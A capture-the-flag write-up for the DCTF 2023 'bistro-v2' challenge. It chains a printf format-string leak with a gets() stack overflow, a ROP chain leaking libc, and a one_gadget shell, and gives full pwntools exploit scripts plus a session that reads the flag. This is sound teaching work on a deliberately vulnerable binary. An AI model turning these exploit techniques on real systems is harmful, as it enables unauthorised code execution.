# 2023 DCTF - bistro-v2

We are given two files: restaurant-v2 binary and libc shared object:
```
$ file restaurant-v2 libc-2.27.so 
restaurant-v2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cefe83d2f599154447cfd669b9f8205c67029f5a, with debug_info, not stripped
libc-2.27.so:  ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=71f0f3074a929e519e85f6a5c03a7d1fd976bfe4, for GNU/Linux 3.2.0, stripped
```

In disassembly we see that binary contains two stages. First stage is to provide a ticket to pass:
```
...
  fd = open("/dev/urandom",0);
  if (fd == -1) {
    puts("Open failed");
    iVar1 = -1;
  }
  else {
    sVar2 = read(fd,&flag,4);
    if (sVar2 == 4) {
      close(fd);
      puts("Wellcome to the restaurant V2!");
      fflush(stdout);
      fgets(buff,0x400,stdin);
      printf(buff);
      puts("Show me your ticket to pass: ");
      fflush(stdout);
      __isoc99_scanf(&DAT_00400ced,&not_flag);
      if (flag == not_flag) {
        restaurant();
      }
      else {
        puts("Permission denied!\n");
      }
      iVar1 = 0;
    }
...
```

This stage is vulnerable to string format due to `printf(buff)` where `buff` is the user's input:
```
$ ./restaurant-v2 
Wellcome to the restaurant V2!
%08x.%08x.%08x.%08x
9e265b03.fbad208b.006020c0.00000001
Show me your ticket to pass: 

```

In the debugger we can check the offset that prints out the random value expected to be "the ticket":
```
pwndbg> disass main
...
 0x0000000000400a6e <+216>:	call   0x4006c0 <puts@plt>
 0x0000000000400a73 <+221>:	mov    rax,QWORD PTR [rip+0x201606]        # 0x602080 <stdout@@GLIBC_2.2.5>
 0x0000000000400a7a <+228>:	mov    rdi,rax
 0x0000000000400a7d <+231>:	call   0x400730 <fflush@plt>
 0x0000000000400a82 <+236>:	lea    rax,[rbp-0xc]
 0x0000000000400a86 <+240>:	mov    rsi,rax
 0x0000000000400a89 <+243>:	lea    rdi,[rip+0x25d]        # 0x400ced
 0x0000000000400a90 <+250>:	mov    eax,0x0
 0x0000000000400a95 <+255>:	call   0x400750 <__isoc99_scanf@plt>
 0x0000000000400a9a <+260>:	mov    edx,DWORD PTR [rbp-0x8]
 0x0000000000400a9d <+263>:	mov    eax,DWORD PTR [rbp-0xc]
 0x0000000000400aa0 <+266>:	cmp    edx,eax
...
End of assembler dump.
pwndbg> b *0x0000000000400aa0
Breakpoint 1 at 0x400aa0: file restaurant-v2.c, line 88.
pwndbg> r
Starting program: /home/vm/Downloads/dctf/bistro-v2/restaurant-v2 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Wellcome to the restaurant V2!
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
f7fa2b03.fbad208b.006020c0.00000001.00000000.ffffe158.f7fe6d20.00000000.a329d9d4.00000001.f7df71ca.ffffe140
Show me your ticket to pass: 
123

Breakpoint 1, 0x0000000000400aa0 in main (argc=1, argv=0x7fffffffe158)
    at restaurant-v2.c:88
88	restaurant-v2.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*RAX  0x123
*RBX  0x7fffffffe158 —▸ 0x7fffffffe43f ◂— '/home/vm/Downloads/dctf/bistro-v2/restaurant-v2'
 RCX  0x0
*RDX  0xa329d9d4
*RDI  0x7fffffffdae0 ◂— 0x7fff00333231 /* '123' */
...
pwndbg> p/x $edx
$3 = 0xa329d9d4
```

As seen from the debugger output, the value expected is `a329d9d4` which is the 9th element in the format string output seen above.

We draft the first stage into a script:
```python
from pwn import *

LIBC_PATH = "./libc-2.27.so"
#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

r = remote('34.159.54.247', 30672)
#r = gdb.debug("./restaurant-v2", '''break custom
#''')
r.recvline()
r.sendline(b"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x:%08x")
dump = r.readline()
ans = dump.split(b':')[-1]
r.sendline(ans)

print(r.recvuntil(b">> "))
r.interactive()
```

And it works:
```
$ python3 xpl.py 
[+] Starting local process '/usr/bin/gdbserver': pid 3298
[*] running in new terminal: ['/usr/bin/gdb', '-q', './restaurant-v2', '-x', '/tmp/pwnmfw_1pey.gdb']
b'Show me your ticket to pass: \n==============================\n\n              MENU             \n\n==============================\n\n1. Chessburger...............2$\n\n2. Hamburger.................3$\n\n3. Custom dinner............10$\n\n>> '
[*] Switching to interactive mode

$ 
```

Now comes the disassembly of the second stage which is basically the same as the initial version of the bistro challenge:
```
int custom(void)

{
  char buffer [100];
  
  printf("Choose what you want to eat:");
  gets(buffer);
  gets(buffer);
  return 0;
}
```

We utilize this buffer overflow to perform the following ROP chain:
- 0x400b33 which is `pop rdi ; ret`
- 0x602048 which is the address of the `gets@got.plt` popped into `rdi`
- 0x4006c0 which is the `puts` function

The first three gadgets in the chain are used to leak the gets@got.plt value, or shortly `puts(gets@got.plt)`.

This address leak is further used to calculate the libc base address by taking the offset to gets function inside libc and subtracting it with the leaked address printed by `puts`.

After calculating the libc base address we can just re-run the "Custom dinner" function at `0x40088a` to overflow once more and utilize a "one gadget" which is a call to `execve("/bin/sh", NULL, NULL)` performed inside libc where we jump and obtain a shell in a single gadget chain:
```
$ one_gadget libc-2.27.so 
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

There was no detailed analysis performed which gadget should be used. The offsets were simply tried out until a shell popped up.

This is the complete script that obtains the shell:

```python
from pwn import *

LIBC_PATH = "./libc-2.27.so"

r = remote("34.159.182.195", 32109)
#r = gdb.debug("./restaurant-v2", '''break custom
#''')
r.recvline()
r.sendline(b"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x:%08x")
dump = r.readline()
ans = dump.split(b':')[-1]
r.sendline(ans)

r.recvuntil(b">> ")
r.sendline(b"3")
r.recvuntil(b"eat:")

payload  = b'A'*120
payload += p64(0x00400b33)        # pop rdi ; ret
payload += p64(0x00602048)        # plt
payload += p64(0x004006c0)        # puts
payload += p64(0x0040088a)        # back to roots

r.sendline(payload)
a = r.recvuntil(b"eat:")
g = a.split(b'\n')[0]
print(g)
gets_ptr = int.from_bytes(g, 'little')
print(gets_ptr)

l = ELF(LIBC_PATH)
l.address = gets_ptr - l.sym["gets"]

payload  = b'A'*120
payload += p64(l.address + 0x4f2a5)
r.sendline(payload)
r.interactive()
```

We execute and print the flag:
```
$ python3 xpl.py 
[+] Opening connection to 34.159.182.195 on port 32109: Done
b'`\xa0p\x97\x9a\x7f'
140301942431840
[*] '/home/vm/Downloads/dctf/bistro-v2/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ id
$ id
uid=1000(ctf) gid=3000 groups=3000,2000
$ ls 
flag.txt  restaurant  restaurant-v2  restaurant-v2.c
$ cat flag.txt
CTF{04134a331cd5bed41dc418c04854ac3fd7e03148f0e61d74d61508f19b7c5933}$ 
```
